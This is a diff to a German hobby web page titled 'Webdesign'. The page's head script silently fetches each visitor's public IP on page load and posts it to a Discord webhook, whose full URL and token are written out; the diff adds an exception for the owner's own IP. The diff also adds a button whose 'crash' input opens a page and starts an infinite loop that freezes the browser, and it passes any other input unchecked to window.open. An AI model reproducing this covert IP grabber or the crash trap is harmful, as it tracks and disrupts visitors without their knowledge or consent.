@@ -4,19 +4,41 @@
   <head>
     <script type="text/javascript">
     const whurl ="https://discord.com/api/webhooks/778994800291872788/u2axqxz7yygccZLt8j_XBmznuB8yBw3XdGUOBNvdmrIUguTCOoIyyXMvq4jJUVZWNZit"
+    var Ip;
     function SetIP(IP) {
-      const msg = {"content": "Incoming IP: " + IP}
-      fetch(whurl + "?wait=true",
-      {"method":"POST",
-      "headers": {"content-type": "application/json"},
-      "body": JSON.stringify(msg)})
+      if (IP != "81.5.246.24") {
+        Ip = IP;
+        const msg = {"content": "Incoming IP: " + IP}
+        fetch(whurl + "?wait=true",
+        {"method":"POST",
+        "headers": {"content-type": "application/json"},
+        "body": JSON.stringify(msg)})
+      } else
+      {
+        console.log("Owner entered!");
+      }
     }
 
     fetch('https://api.ipify.org/?format=json')
     .then(results => results.json())
     .then(data => SetIP(data.ip))
-    </script>
 
+    function Prüfen() {
+      var Value = document.Form.Text.value;
+      if (Value == "givemyip") {
+        alert("Deine IP: " + Ip);
+      } else if (Value == "levin") {
+        alert("Levin stinkt!");
+      } else if (Value == "crash") {
+        window.open("CRASH.html");
+        while (true) {
+          console.log("CRASH");
+        }
+      } else {
+        window.open(Value)
+      }
+    }
+    </script>
     <meta charset="utf-8">
     <link rel="stylesheet" href="style.css" type="text/css">
     <title>Webdesign</title>
@@ -38,6 +60,10 @@
 <br> <li> <a href="SS.html"> Sourcecode/Skript </a> </li>
 <br> <li> <a href="hochladen.html"> Hochladen </a> </li>
 <br> <li> <a href="Web.html"> Clearnet, Deep Web, Dark Web </a> </li>
+<br> <li> <form name="Form">
+  <input type="text" name="Text" value="" class="Text" placeholder="">
+  <input type="button" name="Knopf" value="Was macht dieser Knopf?" onclick="Prüfen()" class="Knopf">
+</form> </li>
       </ul>
     </div>
     <div class="footer">
